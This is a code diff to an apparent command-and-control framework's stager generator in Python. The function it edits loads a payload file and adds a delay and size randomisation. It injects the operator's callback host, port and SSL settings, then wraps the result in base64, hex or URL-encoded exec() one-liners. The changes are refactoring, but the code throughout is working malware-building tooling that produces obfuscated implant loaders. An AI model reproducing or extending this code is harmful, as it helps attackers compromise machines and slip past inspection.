@@ -46,7 +46,7 @@ def add_stager(name: str, listener_id: int,
     return "Created Stager successfully!"
 
 
-def get_stager(stager_id: str, one_liner: bool = True) -> str:
+def get_stager(stager_id: int, one_liner: bool = True) -> str:
     """
     Get Content of a Stager to download or copy
 
@@ -59,21 +59,21 @@ def get_stager(stager_id: str, one_liner: bool = True) -> str:
     # Get required Data
     stager: StagerModel = db_session.query(
         StagerModel).filter_by(stager_id=stager_id).first()
-    if not stager:
+    if stager is None:
         raise Exception(f"Stager with ID {stager_id} does not exist")
 
     listener: ListenerModel = db_session.query(
         ListenerModel).filter_by(listener_id=stager.listener_id).first()
     if listener is None:
-        raise Exception("Could not find the listener")
+        raise Exception("Couldn't find the listener.")
     if listener.listener_type not in AVAILABLE_STAGERS: # also works as the stager type
         raise Exception(f"Stager {listener.listener_type} is not available.")
     # Get the Payload from the File
     try:
-        with open("Payloads/" + stager.stager_format + ".py", "r") as f:
+        with open("Payloads/" + listener.listener_type + ".py", "r") as f:
             payload = f.read()
     except:
-        raise Exception("Could not find the payload")
+        raise Exception("Couldn't find the payload.")
 
     # Randomize the Payload
     if stager.random_size:
@@ -90,10 +90,10 @@ def get_stager(stager_id: str, one_liner: bool = True) -> str:
     # Replace the Payload
     finished_payload = start + "\n"
     finished_payload += f"import time\ntime.sleep({stager.delay})\n"
-    finished_payload += f"HOST = '{listener.address}'\n \
-        PORT = {listener.port}\n \
-        TIMEOUT = {stager.timeout}\n \
-        SSL={listener.ssl}\n"
+    finished_payload += f"HOST = '{listener.address}'\n" \
+        f"PORT = {listener.port}\n" \
+        f"TIMEOUT = {stager.timeout}\n" \
+        f"SSL={listener.ssl}\n"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
@@ -111,15 +111,15 @@ def get_stager(stager_id: str, one_liner: bool = True) -> str:
             raise Exception("Encoding not supported")
     else:
         if stager.encoding == "base64":
-            finished_payload = """"import base64; \
-                exec(base64.b64decode(b'%s'))""" % base64.b64encode(
+            finished_payload = "import base64;" \
+                "exec(base64.b64decode(b'%s'))" % base64.b64encode(
                 finished_payload.encode()).decode()
         elif stager.encoding == "hex":
-            finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
+            finished_payload = "from binascii import unhexlify;exec(unhexlify('%s'))" % hexlify(
                 finished_payload.encode()).decode()
         elif stager.encoding == "url":
-            finished_payload = """import urllib.parse; \
-            exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
+            finished_payload = "import urllib.parse;" \
+            "exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                 finished_payload)
         elif stager.encoding == "raw":
             pass
